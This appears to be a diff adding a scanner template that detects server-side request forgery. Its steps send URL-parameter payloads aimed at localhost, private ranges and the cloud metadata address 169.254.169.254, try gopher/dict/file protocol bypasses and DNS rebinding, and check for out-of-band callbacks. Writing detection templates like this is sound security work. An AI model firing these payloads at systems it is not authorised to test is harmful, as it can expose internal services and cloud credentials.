@@ -1,0 +1,72 @@
+id: advanced-ssrf-detection
+name: "Advanced SSRF Detection"
+severity: "critical"
+tags: [ssrf, oob, advanced]
+description: |
+  综合演示：workflow + range + OOB
+  这是一个完整的 SSRF 检测模板。
+
+workflow:
+  # 步骤1：基础 SSRF 测试
+  - name: "trigger-ssrf"
+    http:
+      - raw: |
+          GET /api/fetch?url=http://{{oob}} HTTP/1.1
+          Host: {{Hostname}}
+        range:
+          key: "oob"
+          values:
+            - "{{oob}}"
+            - "http://{{oob}}"
+            - "http://127.0.0.1"
+            - "http://localhost"
+            - "http://169.254.169.254"
+            - "http://192.168.1.1"
+            - "http://10.0.0.1"
+        matchers:
+          - type: status
+            status: [200, 202, 204]
+
+  # 步骤2：协议绕过测试
+  - name: "test-protocols"
+    requires: ["trigger-ssrf"]
+    http:
+      - raw: |
+          GET /api/proxy?target={{protocol}}://{{oob}} HTTP/1.1
+          Host: {{Hostname}}
+        range:
+          key: "protocol"
+          values:
+            - "http"
+            - "https"
+            - "ftp"
+            - "gopher"
+            - "dict"
+            - "file"
+        matchers:
+          - type: status
+            status: [200, 202, 204]
+
+  # 步骤3：DNS 重绑定测试
+  - name: "dns-rebinding"
+    requires: ["trigger-ssrf"]
+    http:
+      - raw: |
+          GET /api/fetch?url=http://{{oob_label}}.{{oob_domain}} HTTP/1.1
+          Host: {{Hostname}}
+        matchers:
+          - type: status
+            status: [200]
+
+  # 步骤4：OOB 验证（等待回调）
+  - name: "verify-callback"
+    requires: ["trigger-ssrf"]
+    http:
+      - raw: |
+          GET /api/verify?label={{oob_label}} HTTP/1.1
+          Host: api.ceye.io
+        matchers:
+          - type: dsl
+            dsl:
+              - "status_code == 200"
+              - "contains(body, 'data')"
